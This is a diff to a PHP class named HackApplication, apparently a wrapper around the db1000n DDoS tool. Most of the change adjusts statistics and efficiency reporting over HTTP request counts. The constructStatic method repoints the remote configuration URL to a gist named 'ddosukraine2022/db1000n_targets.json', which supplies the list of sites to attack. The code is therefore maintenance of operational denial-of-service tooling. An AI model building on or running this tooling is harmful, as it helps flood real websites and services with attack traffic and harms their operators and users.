@@ -230,12 +230,15 @@ class HackApplication
         if (!$this->stat  ||  !$this->stat->targets) {
             return null;
         }
-        ResourcesConsumption::startTaskTimeTracking('HackApplicationGetStatisticsBadge');
 
         if (is_object($this->stat->targets)) {
             $targets = get_object_vars($this->stat->targets);
             ksort($targets);
             $this->stat->targets = $targets;
+        }
+
+        if (!count($this->stat->targets)) {
+            return null;
         }
 
         $columnsDefinition = [
@@ -300,7 +303,6 @@ class HackApplication
         ];
         $rows[] = $row;
 
-        ResourcesConsumption::stopTaskTimeTracking('HackApplicationGetStatisticsBadge');
         return mbRTrim(generateMonospaceTable($columnsDefinition, $rows));
     }
 
@@ -308,14 +310,14 @@ class HackApplication
     public function getEfficiencyLevel()
     {
 
-        if (!$this->stat  ||  !$this->stat->targets  ||  !count($this->stat->targets)) {
+        if (!isset($this->stat->db1000nx100->totalHttpRequests)) {
             return null;
         }
 
         $requests = $this->stat->db1000nx100->totalHttpRequests;
         $responses = $this->stat->db1000nx100->totalHttpResponses;
 
-        if (! $requests) {
+        if (!$requests) {
             return null;
         }
 
@@ -366,7 +368,9 @@ class HackApplication
     public static function constructStatic()
     {
         global $TEMP_DIR;
-        static::$configUrl = 'https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json';
+
+        static::$configUrl = 'https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/db1000n_targets.json';
+        //static::$configUrl = 'https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json';
         static::$localConfigPath = $TEMP_DIR . '/db1000n-config.json';
         static::$useLocalConfig = false;
     }
